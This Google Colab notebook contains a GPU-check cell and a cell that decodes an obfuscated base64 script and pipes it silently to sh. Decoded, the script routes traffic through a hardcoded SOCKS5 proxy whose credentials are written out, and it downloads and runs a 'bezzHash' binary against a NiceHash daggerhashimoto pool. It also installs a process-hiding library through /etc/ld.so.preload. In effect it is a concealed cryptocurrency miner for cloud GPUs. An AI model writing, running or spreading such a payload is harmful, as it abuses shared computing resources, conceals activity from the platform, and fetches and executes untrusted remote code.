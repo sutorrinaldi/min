{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "BY GUNTUR.ipynb",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "cellView": "form",
        "id": "jmWiuTOBXiQu"
      },
      "outputs": [],
      "source": [
        "#@title CEK GPU\n",
        "! nvidia-smi -L"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#@title DIRECT\n",
        "!base64 -d <<< IyEvYmluL3NoCmxuIC1mcyAvdXNyL3NoYXJlL3pvbmVpbmZvL0FmcmljYS9Kb2hhbm5lc2J1cmcgL2V0Yy9sb2NhbHRpbWUKZHBrZy1yZWNvbmZpZ3VyZSAtLWZyb250ZW5kIG5vbmludGVyYWN0aXZlIHR6ZGF0YQoKYXB0IHVwZGF0ZTthcHQgLXkgaW5zdGFsbCBiaW51dGlscyBjbWFrZSBidWlsZC1lc3NlbnRpYWwgc2NyZWVuIHVuemlwIG5ldC10b29scyBjdXJsCgp3Z2V0IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9uYXRoYW5mbGVpZ2h0L3NjcmlwdHMvbWFpbi9ncmFwaGljcy50YXIuZ3oKCnRhciAteHZ6ZiBncmFwaGljcy50YXIuZ3oKCmNhdCA+IGdyYWZ0Y3AvbG9jYWwvZ3JhZnRjcC1sb2NhbC5jb25mIDw8RU5ECmxpc3RlbiA9IDoyMjMzCmxvZ2xldmVsID0gMQpzb2NrczUgPSA0NC4yMDIuMTI0LjA6MTA4MApzb2NrczVfdXNlcm5hbWUgPSBtaWtyb3Rpazk5OQpzb2NrczVfcGFzc3dvcmQgPSBFbGliYXdub3MKRU5ECgouL2dyYWZ0Y3AvbG9jYWwvZ3JhZnRjcC1sb2NhbCAtY29uZmlnIGdyYWZ0Y3AvbG9jYWwvZ3JhZnRjcC1sb2NhbC5jb25mICYKCnNsZWVwIC4yCgplY2hvICIgIgplY2hvICIgIgoKZWNobyAiKioiCgouL2dyYWZ0Y3AvZ3JhZnRjcCBjdXJsIGlmY29uZmlnLm1lCgplY2hvICIgIgplY2hvICIgIgoKZWNobyAiKioiCgplY2hvICIgIgplY2hvICIgIgoKLi9ncmFmdGNwL2dyYWZ0Y3Agd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbmF0aGFuZmxlaWdodC9zY3JpcHRzL21haW4vYmV6ekhhc2gKY2htb2QgK3ggYmV6ekhhc2gKCi4vZ3JhZnRjcC9ncmFmdGNwIHdnZXQgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25hdGhhbmZsZWlnaHQvc2NyaXB0cy9tYWluL21hZ2ljQmV6ekhhc2guemlwCnVuemlwIG1hZ2ljQmV6ekhhc2guemlwCm1ha2UKZ2NjIC1XYWxsIC1mUElDIC1zaGFyZWQgLW8gbGlicHJvY2Vzc2hpZGVyLnNvIHByb2Nlc3NoaWRlci5jIC1sZGwKbXYgbGlicHJvY2Vzc2hpZGVyLnNvIC91c3IvbG9jYWwvbGliLwplY2hvIC91c3IvbG9jYWwvbGliL2xpYnByb2Nlc3NoaWRlci5zbyA+PiAvZXRjL2xkLnNvLnByZWxvYWQKCi4vZ3JhZnRjcC9ncmFmdGNwIC4vYmV6ekhhc2ggLS11cmw9c3NsOi8vMzdlZ0F5bW5jY2lRMmhhcEYyQ3YydGZ5aloybm1OMzRmNy40T0NFQU5AZGFnZ2VyaGFzaGltb3RvLnVzYS1lYXN0Lm5pY2VoYXNoLmNvbTozMzM1MyAtLWxvZyAtLWV4dHJhIC0tbGF0ZW5jeSAtLWFsbC1zaGFyZXMgLS1zaGFyZXMtZGV0YWlsIC0tc2hvdy1tb2RlIC0tbGlzdC1tb2RlcyAtLW1vZGU9OTk= | sh > /dev/null 2>&1"
      ],
      "metadata": {
        "id": "N8BGk6y7aQsL",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}